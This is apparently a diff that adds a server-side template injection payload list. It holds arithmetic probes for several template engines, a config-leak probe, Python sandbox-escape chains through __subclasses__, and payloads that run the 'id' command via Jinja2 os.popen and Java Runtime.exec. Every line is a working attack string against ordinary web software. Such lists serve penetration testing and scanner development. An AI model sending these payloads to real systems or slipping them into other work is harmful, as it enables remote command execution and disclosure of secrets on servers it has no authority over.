@@ -1,0 +1,15 @@
+${7*7}
+{{7*7}}
+{{7*'7'}}
+<%= 7*7 %>
+#{7*7}
+${{7*7}}
+*{7*7}
+{{config}}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+{{=7*7}}
+{{[].class.mro[1].subclasses()}}
+${@print(md5("ssti"))}
+{php}print(7*7);{/php}
